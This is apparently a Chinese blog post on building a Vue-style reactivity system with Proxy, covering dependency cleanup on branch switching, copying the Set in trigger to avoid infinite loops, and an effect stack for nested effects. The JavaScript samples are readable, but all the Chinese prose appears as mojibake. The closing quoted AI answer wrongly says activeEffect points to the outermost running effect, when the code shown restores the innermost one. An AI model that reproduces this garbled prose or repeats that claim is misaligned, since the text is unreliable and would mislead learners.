<p>æ‰€ä»¥weakMapç»å¸¸ç”¨äºå­˜å‚¨é‚£äº›åªæœ‰å½“keyæ‰€å¼•ç”¨çš„å¯¹è±¡å­˜åœ¨æ—¶(æ²¡æœ‰è¢«å›æ”¶)æ‰æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-5">04-åˆ†æ”¯åˆ‡æ¢ä¸cleanup</h2>
<p>è§‚å¯Ÿä¸‹é¢çš„ä»£ç ï¼Œå®ƒçš„æ‰§è¡Œé€»è¾‘åˆ†ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li>obj.okä¸º true , è·å–obj.textçš„å±æ€§ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¼šè§¦å‘ä¸¤æ¬¡ä»£ç†å¯¹è±¡çš„getå¯¹è±¡ï¼Œåˆ†åˆ«ä¸º okå’Œtext ä¸¤ä¸ªå±æ€§æ·»åŠ å‰¯ä½œç”¨å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯å‰¯ä½œç”¨å‡½æ•°ä¼šä¾èµ–ä¸¤ä¸ªå±æ€§æ‰§è¡Œ</li>
<li>obj.okä¸ºfalseçš„æ—¶å€™ï¼Œåªä¼šæ·»åŠ ä¸€æ¬¡ï¼Œå‰¯ä½œç”¨å‡½æ•°ä¾èµ–ä¸€ä¸ªå‡½æ•°ã€‚</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>,<span class="hljs-attr">ok</span>:<span class="hljs-literal">true</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>()

<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">ok</span> ? obj.<span class="hljs-property">text</span> :<span class="hljs-string">'not'</span>
})
</code></pre>
<p>å‡å¦‚æˆ‘ä»¬çš„ä»£ç æ˜¯è¿™æ ·æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬è®¾ç½®</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj.ok</span> = <span class="hljs-literal">false</span>
</code></pre>
<p>å®ƒçš„æ‰§è¡Œè¿‡ç¨‹æ˜¯è¿™æ ·ï¼š</p>
<ul>
<li>é¦–å…ˆä¼šé»˜è®¤æ‰§è¡Œï¼Œåœ¨æ³¨å†Œå‡½æ•°ä¸­è§¦å‘äº†ä¸¤æ¬¡è·å–ä»£ç†å¯¹è±¡çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±åœ¨è¿™ä¸ªä»£ç†å¯¹è±¡çš„ä¸¤ä¸ªå±æ€§ä¸‹é¢åˆ†åˆ«æ·»åŠ äº†å¯¹åº”çš„ç›‘å¬å‡½æ•°</li>
<li>æ¥ç€æˆ‘ä»¬è®¾ç½®äº† obj.ok= false</li>
<li>å½“æˆ‘ä»¬è®¾ç½®äº†è¿™ä¸ªä»¥åï¼Œæˆ‘ä»¬è§¦å‘äº†obj.okä¸‹é¢çš„ç›‘å¬å‡½æ•°ï¼Œç›‘å¬å‡½æ•°å°±ä¼šæ‰§è¡Œ</li>
</ul>
<p><code>document.body.innerText = obj.ok ? obj.text :'not'</code></p>
<ul>
<li>ç”±äºobj.okæ˜¯false æ‰€ä»¥ è¿™ä¸€æ¬¡ä¸æ˜¯ç»™ä¸¤ä¸ªå±æ€§æ·»åŠ ç›‘å¬å‡½æ•°ï¼Œè€Œæ˜¯åªç»™obj.okæ·»åŠ ã€‚</li>
</ul>
<p>ä½†æ˜¯ç”±äºæˆ‘ä»¬ ä¹‹å‰çš„ç›‘å¬å‡½æ•°è¿˜åœ¨ ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¡æ—¶åªéœ€è¦è§¦å‘ä¸€æ¬¡ obj.okç­‰äºfalseçš„ç›‘å¬å‡½æ•°</p>
<p>è¿˜æ˜¯ä¼šè§¦å‘ä¸¤æ¬¡ ï¼Œä¸€æ¬¡æ˜¯æ—§çš„ã€‚</p>
<p><strong>è¿™ä¸ªé—®é¢˜å°±æ˜¯åˆ†æ”¯</strong>ï¼è§£å†³åŠæ³•å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨æ·»åŠ ç›‘å¬å‡½æ•°ä¹‹å‰ ï¼Œå…ˆæŠŠæ—§çš„æ¸…ç©ºæ‰å°±å¯ä»¥äº†ã€‚</p>
<blockquote>
<p>å¦‚æœæŒ‰ç…§æˆ‘çš„æƒ³æ³• å°±ä¼šæƒ³åˆ° æˆ‘åœ¨å†æ¬¡è®°å½•å‰¯ä½œç”¨ä¹‹å‰æ¸…é™¤æ—§çš„ä¾èµ–ï¼Œå°±éœ€è¦æŒ¨ä¸ªéå†ï¼Œä½†æ˜¯æŒ¨ä¸ªéå†ä¹Ÿæ˜¯æˆæœ¬ï¼</p>
</blockquote>
<ul>
<li>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“ï¼Œéƒ½æœ‰è°ä¿å­˜äº†å½“å‰çš„å‰¯ä½œç”¨çš„ä¾èµ–ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™äº›ä¾èµ–éƒ½å»æ‰ï¼Œè¿™é‡Œç›´æ¥åœ¨å½“å‰å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢åŠ å·¥ä¸€å±‚ï¼Œä¿å­˜åœ¨ç›¸å…³è”çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢</li>
<li>åœ¨æˆ‘ä»¬æ³¨å†Œå‡½æ•°ä¹‹å‰ï¼ŒæŠŠä¹‹å‰çš„ä¾èµ–éƒ½æ¸…æ‰ã€‚</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
const data = {text:<span class="hljs-string">"hello world"</span>,ok:true}

<span class="hljs-comment">//æ¸…ç†æ—§çš„å‰¯ä½œç”¨å‡½æ•°</span>
const cleanup =(effectFn)=&gt;{
    <span class="hljs-comment">//éå†effectFn.depsæ•°ç»„</span>
   <span class="hljs-built_in">for</span>(const deps of effectFn.deps){
      <span class="hljs-comment">//è¿™é‡Œçš„depså®é™…ä¸Šæ˜¯set---è¿™é‡Œåˆ é™¤çš„å®é™…ä¸Šæ˜¯å®ƒè‡ªå·± å…¶ä»–çš„å‰¯ä½œç”¨å‡½æ•°æ²¡æœ‰åˆ é™¤</span>
      deps<span class="hljs-selector-class">.delete</span>(effectFn)
   }
    <span class="hljs-comment">//é‡ç½®effectFn.depsæ•°ç»„</span>
   effectFn<span class="hljs-selector-class">.deps</span><span class="hljs-selector-class">.length</span> = <span class="hljs-number">0</span>
}

<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
const bucket = new <span class="hljs-built_in">WeakMap</span>()
<span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
let activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
const registerEffect=(fn)=&gt;{
    if (!fn) return ;
    const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
    }
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
}
<span class="hljs-comment">//å®Œæˆtarget--&gt;key--&gt;effect çš„å…³è”æ³¨å†Œ</span>
<span class="hljs-comment">//åœ¨getå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const track=(target,key)=&gt;{
   <span class="hljs-comment">//00 - åˆ¤æ–­activeEffectæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ ç›´æ¥è¿”å›</span>
   <span class="hljs-built_in">if</span>(!activeEffect) return
   <span class="hljs-comment">//01- æ ¹æ®ç›®æ ‡å¯¹è±¡è·å– å¯¹åº”çš„ key--&gt;effects</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-comment">//å¦‚æœä¸å­˜åœ¨ å°±åˆ›å»º</span>
   <span class="hljs-built_in">if</span>(!depsMap){
      depsMap = new <span class="hljs-built_in">Map</span>()
      bucket<span class="hljs-selector-class">.set</span>(target,depsMap)
   }
   <span class="hljs-comment">//02-æ ¹æ®å±æ€§è·å– å¯¹åº”çš„ å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ— å®ƒæ˜¯ä¸€ä¸ªSet</span>
   let deps = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-built_in">if</span>(!deps){
      deps = new <span class="hljs-built_in">Set</span>()
      depsMap<span class="hljs-selector-class">.set</span>(key,deps)
   }
   <span class="hljs-comment">//03- æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ‹¿åˆ°çš„seté˜Ÿåˆ—é‡Œé¢</span>
   deps<span class="hljs-selector-class">.add</span>(activeEffect)
   <span class="hljs-comment">//04- add-- depså°±æ˜¯ä¸€ä¸ªä¸å½“å‰å‰¯ä½œç”¨å‡½æ•°å­˜åœ¨å…³è”å…³ç³»çš„é›†åˆ</span>
   activeEffect<span class="hljs-selector-class">.deps</span><span class="hljs-selector-class">.push</span>(deps)
}
<span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-built_in">if</span>(!depsMap) return ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-comment">//åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ</span>
   <span class="hljs-comment">// effects &amp;&amp; effects.forEach(fn=&gt;fn());</span>

   <span class="hljs-comment">//ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
   const effectToRun = new <span class="hljs-built_in">Set</span>(effects)
   effectToRun<span class="hljs-selector-class">.forEach</span>(fn=&gt;fn());
}

<span class="hljs-comment">//é‡å†™æ‹¦æˆªçš„é€»è¾‘</span>
const obj = new <span class="hljs-built_in">Proxy</span>(data,{
   //æ‹¦æˆªè¯»å–çš„æ“ä½œ
   get(target,key){
      <span class="hljs-built_in">track</span>(target,key)
      <span class="hljs-comment">//è¿”å›å±æ€§çš„å€¼</span>
      return target<span class="hljs-selector-attr">[key]</span>
   },
   <span class="hljs-comment">//æ‹¦æˆªè®¾ç½®çš„æ“ä½œ</span>
   <span class="hljs-built_in">set</span>(target,key,newValue){
      <span class="hljs-comment">//è®¾ç½®å±æ€§å€¼</span>
      target<span class="hljs-selector-attr">[key]</span> = newValue
      <span class="hljs-built_in">trigger</span>(target,key)
   },
})

<span class="hljs-built_in">registerEffect</span>(()=&gt;{
   console<span class="hljs-selector-class">.log</span>("æ‰§è¡Œäº†å‡ æ¬¡")
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   document<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.innerText</span> = obj<span class="hljs-selector-class">.ok</span> ? obj<span class="hljs-selector-class">.text</span>:<span class="hljs-string">'not'</span>
})
<span class="hljs-built_in">setTimeout</span>(()=&gt;{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj<span class="hljs-selector-class">.ok</span> = false
},<span class="hljs-number">1000</span>)
</code></pre>
<h3 data-id="heading-6">set çš„æ— é™å¾ªç¯</h3>
<p>å¦‚æœæˆ‘ä»¬åœ¨ä¸€æ¬¡setçš„å¾ªç¯éå†é‡Œé¢æ—¢åˆ é™¤ï¼Œåˆæ·»åŠ åŒä¸€ä¸ªå…ƒç´ ï¼Œå°±ä¼šé€ æˆsetçš„æ— é™å¾ªç¯éå†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨trggerå‡½æ•°ä¸­ï¼Œä¿®æ”¹äº†ä¸€ä¸‹çš„ä»£ç </p>
<pre><code class="hljs language-ini" lang="ini">   //åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ
   // effects &amp;&amp; effects.forEach(<span class="hljs-attr">fn</span>=&gt;fn())<span class="hljs-comment">;</span>

   //ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ
   const <span class="hljs-attr">effectToRun</span> = new Set(effects)
   effectToRun.forEach(<span class="hljs-attr">fn</span>=&gt;fn())<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-7">05-åµŒå¥—çš„effectä¸effectæ ˆ</h2>
<p>å¦‚æœæˆ‘ä»¬çš„å‡½æ•°å‘ç”Ÿäº†åµŒå¥— ï¼Œèƒ½ä¸èƒ½æ­£å¸¸æ‰§è¡Œå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">data</span> = {bar:<span class="hljs-literal">true</span>,foo:<span class="hljs-literal">true</span>}
const <span class="hljs-attr">obj</span> = new Proxy()
registerEffect(()=&gt;{
   console.log("effectFn1 æ‰§è¡Œ")
   registerEffect(()=&gt;{
      console.log("effectFn2 æ‰§è¡Œ")
      <span class="hljs-attr">temp2</span> = obj.bar
   })
   <span class="hljs-attr">temp1</span> = obj.foo
})
<span class="hljs-attr">obj.bar</span> = <span class="hljs-literal">false</span>
</code></pre>
<p>æŒ‰ç…§æˆ‘ä»¬çš„ç†è§£ å®ƒä¼šå»ºç«‹å¦‚ä¸‹çš„å“åº”å¼ç»“æ„å…³ç³»</p>
<pre><code class="hljs language-css" lang="css">obj
|<span class="hljs-attr">--bar</span>
|--|<span class="hljs-attr">--effectFn2</span>
|<span class="hljs-attr">--foo</span>
|--|<span class="hljs-attr">--effectFn1</span>
</code></pre>
<p>æˆ‘ä»¬åœ¨æ‰§è¡Œ<code>obj.bar = false</code>çš„æ—¶å€™ï¼Œåº”è¯¥æ‰§è¡Œ <code>effectFn1</code></p>
<p>ä½†æ˜¯å®é™…ä¸Šå®ƒçš„æ‰§è¡Œå´æ˜¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c5ac62977f74d918347bd64b6ceec6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=l6QNO5%2FQa2jK5Ll7rcL02hk9RHo%3D" alt="" loading="lazy"/></p>
<p>å®ƒé»˜è®¤æ‰§è¡Œçš„æ—¶å€™ é¡ºåºæ˜¯å¯¹çš„ï¼Œé”™è¯¯çš„æ˜¯æˆ‘ä»¬ä¿®æ”¹äº†barçš„å€¼ï¼Œå±…ç„¶æ‰§è¡Œåœ°effectFn 2 ï¼Œè€Œä¸æ˜¯ 1 ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</p>
<p>åŸå› å…¶å®å°±è—åœ¨æˆ‘ä»¬çš„activeEffectä¸Šé¢</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
let activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
const registerEffect=(fn)=&gt;{
    if (!fn) return ;
    const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
       }
    <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
    effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
    <span class="hljs-built_in">effectFn</span>()
}
</code></pre>
<p>ç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨activeEffectæ¥ä¸´æ—¶ä¿å­˜å½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œè€Œä¸”å”¯ä¸€çš„ä¸€ä¸ªï¼Œä¸€æ—¦åµŒå¥—å‡½æ•°çš„å†…å±‚å‡½æ•°æ‰§è¡Œï¼Œå°±ä¼šæŠŠå†…å±‚å‡½æ•°è¦†ç›–å¤–å±‚å‡½æ•°çš„activeEffectçš„å€¼ï¼Œè€Œä¸”æ°¸è¿œæ— æ³•æ¢å¤ï¼Œè€Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ”¶é›†å¤–å±‚çš„å‰¯ä½œç”¨å‡½æ•°åˆ°ä¾èµ–ä¸­ï¼Œå°±ä¼šé”™è¯¯çš„æ·»åŠ ä¸Šå†…å±‚å‡½æ•°çš„åœ°å€ï¼Œ<strong>è¿™å°±æ˜¯åµŒå¥—å‡½æ•°çš„é—®é¢˜æ‰€åœ¨ï¼</strong></p>
<p>è§£å†³åŠæ³•å°±æ˜¯ï¼šåˆ©ç”¨æ ˆçš„ç‰¹æ€§ï¼Œæ¯ä¸€æ¬¡å‡½æ•°çš„è°ƒç”¨ï¼Œå°±ä¼šæ·»åŠ ä¸€å±‚æ ˆã€‚æ‰§è¡Œä¹‹å‰push æ‰§è¡Œä¹‹åpop</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//add---effect æ ˆ</span>
const effectStack = <span class="hljs-selector-attr">[]</span>
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn)=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//add---åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
      effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
       <span class="hljs-comment">//add--åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
       effectStack<span class="hljs-selector-class">.pop</span>()
       <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
       activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
       }
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<h3 data-id="heading-8">ç†è§£åå·®çš„åœ°æ–¹ï¼š</h3>
<p>æˆ‘ä¸€ç›´åœ¨æƒ³ï¼Œä¸ºä»€ä¹ˆfn()æ‰§è¡Œå®Œæ¯•åï¼Œ activeEffectçš„æ¢å¤ä¸æ˜¯ä½¿ç”¨effectStack.pop()ï¼Œåœ¨è¿™ä¸€å±‚æ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒåº”è¯¥æ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œæˆ‘çš„å­å‡½æ•°fn()æ‰§è¡Œå®Œæ¯•ï¼Œæ‰§è¡Œçš„æ—¶æœºåˆ°äº†çˆ¶è¿™é‡Œï¼Œåœ¨çˆ¶çš„è¿™ä¸€å±‚ï¼Œæ ˆæ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œ</p>
<p>æˆ‘ç›´æ¥å°±å¯ä»¥é€šè¿‡effectStack.pop() æ‹¿åˆ°è¿™ä¸€å±‚çš„å‘€ã€‚</p>
<hr/>
<p>ä½†æ˜¯å®é™…ä¸ŠactiveEffectçš„ä½¿ç”¨å¹¶ä¸æ˜¯è¿™æ ·æ‰§è¡Œçš„ã€‚</p>
<p>åœ¨fn()æ‰§è¡Œçš„æ—¶å€™ï¼Œå¦‚æœé‡Œé¢æœ‰è§¦å‘ä»£ç†å¯¹è±¡çš„getï¼Œå®ƒä¼šç«‹åˆ»æ‰§è¡Œï¼Œç«‹åˆ»å°±ä¼šè§¦å‘æ”¶é›†ä¾èµ–çš„å‡½æ•°ã€‚é‚£æˆ‘ä»¬çš„å‡½æ•°åˆšåˆšæ‰§è¡Œåˆ°äº†activeEffect=effectFn å°±ä¼šæ´¾ä¸Šç”¨åœºï¼Œå®ƒä¼šè¢«æ­£ç¡®çš„ä¿å­˜åˆ°å¯¹åº”çš„ set ä¸­ã€‚</p>
<p><strong>å½“ fn æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸€å±‚å¯¹åº”çš„effectFnæ’é™¤æ‰ï¼Œæ­£å¼æˆ‘ä»¬çŸ¥é“å®ƒæ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œä¸€è¿›ä¸€å‡ºï¼ŒæŠŠæˆ‘ä»¬è‡ªå·±çš„å½±å“æ¶ˆé™¤æ‰ï¼Œç„¶å æŠŠactiveEffectæ¢å¤åˆ°ä¸Šä¸€å±‚ã€‚</strong></p>
<p>å½“æ¢å¤åˆ°ä¸Šä¸€å±‚ä¹‹åï¼Œå®é™…ä¸Šå‡½æ•°çš„æ‰§è¡Œä¼šç»§ç»­å›åˆ°çˆ¶çš„fnä¸­ï¼Œç»§ç»­è¿›è¡Œå‰¯ä½œç”¨å‡½æ•°çš„ç»‘å®šï¼Œé‚£è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ¢å¤çš„activeEffectå°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p>
<h3 data-id="heading-9">çœ‹ AI çš„å›ç­”ï¼š</h3>
<blockquote>
<p>effectStackçš„ä½œç”¨åœ¨äºç®¡ç†åµŒå¥—çš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç¡®ä¿åœ¨åµŒå¥—è°ƒç”¨ä¸­activeEffectçš„æ­£ç¡®æ€§ã€‚å®ƒæ˜¯ä½œä¸ºä¸€ä¸ªæ ˆï¼ˆstackï¼‰æ•°æ®ç»“æ„å®ç°çš„ï¼Œéµå¾ªâ€œåè¿›å…ˆå‡ºâ€ï¼ˆLIFO, Last In First Outï¼‰åŸåˆ™ã€‚è®©æˆ‘ä»¬ä¸€æ­¥æ­¥åˆ†æå®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š</p>
<ol>
<li>å…¥å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œ: å½“è°ƒç”¨registerEffectæ—¶ï¼Œå†…éƒ¨å®šä¹‰çš„å‰¯ä½œç”¨å‡½æ•°effectFnè¢«æ‰§è¡Œã€‚åœ¨æ‰§è¡Œå‰ï¼Œé€šè¿‡activeEffect = effectFn;è®¾ç½®å½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œå¹¶å°†è¯¥å‡½æ•°å‹å…¥effectStack(effectStack.push(activeEffect)), è¿™ä¸€æ­¥æ˜¯ä¸ºäº†è®°å½•å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç‰¹åˆ«æ˜¯å½“æœ‰åµŒå¥—çš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨æ—¶ã€‚</li>
<li>åµŒå¥—è°ƒç”¨ç®¡ç†: å¦‚æœåœ¨æ‰§è¡ŒæŸä¸ªå‰¯ä½œç”¨å‡½æ•°æœŸé—´åˆè°ƒç”¨äº†å…¶ä»–å‰¯ä½œç”¨å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œåœ¨effectFn1å†…éƒ¨æ³¨å†Œå¹¶æ‰§è¡ŒeffectFn2ï¼‰ï¼Œè¿™ä¸ªæ–°å‰¯ä½œç”¨å‡½æ•°ä¹Ÿä¼šæŒ‰ç…§åŒæ ·çš„æµç¨‹è®¾ç½®è‡ªå·±ä¸ºactiveEffectå¹¶å‹å…¥æ ˆé¡¶ã€‚è¿™æ ·ï¼Œå³ä½¿åœ¨åµŒå¥—è°ƒç”¨ä¸­ï¼Œæ¯ä¸ªå±‚çº§çš„å‰¯ä½œç”¨å‡½æ•°éƒ½èƒ½å‡†ç¡®çŸ¥é“åœ¨å…¶æ‰§è¡ŒæœŸé—´è°æ˜¯å½“å‰çš„â€œæ´»è·ƒâ€å‰¯ä½œç”¨å‡½æ•°ã€‚</li>
<li>é€€å‡ºå‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œ: å½“ä¸€ä¸ªå‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œé€šè¿‡effectStack.pop()å°†å…¶ä»æ ˆä¸­ç§»é™¤ï¼Œç„¶åactiveEffect = effectStack[effectStack.length - 1];å°†activeEffectæ¢å¤ä¸ºä¸Šä¸€å±‚çš„å‰¯ä½œç”¨å‡½æ•°ã€‚è¿™æ ·åšç¡®ä¿äº†å½“åµŒå¥—è°ƒç”¨ç»“æŸæ—¶ï¼Œå¤–éƒ¨å‰¯ä½œç”¨å‡½æ•°èƒ½å†æ¬¡æˆä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ã€‚</li>
</ol>
<p>é€šè¿‡è¿™æ ·çš„ç®¡ç†ï¼ŒeffectStackä¿è¯äº†åœ¨ä»»ä½•æ—¶å€™ï¼ŒactiveEffectéƒ½æŒ‡å‘äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„æœ€å¤–å±‚çš„å‰¯ä½œç”¨å‡½æ•°ã€‚è¿™å¯¹äºä¾èµ–æ”¶é›†ï¼ˆåœ¨trackå‡½æ•°ä¸­ï¼‰å’Œä¾èµ–è§¦å‘ï¼ˆåœ¨triggerå‡½æ•°ä¸­ï¼‰è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒè®©ç³»ç»Ÿèƒ½å¤Ÿå‡†ç¡®åœ°çŸ¥é“å“ªäº›å‡½æ•°éœ€è¦åœ¨æ•°æ®å˜åŒ–æ—¶é‡æ–°æ‰§è¡Œï¼Œä»è€Œå®ç°äº†å“åº”å¼æ•°æ®ç»‘å®šçš„é€»è¾‘ã€‚</p>
</blockquote>
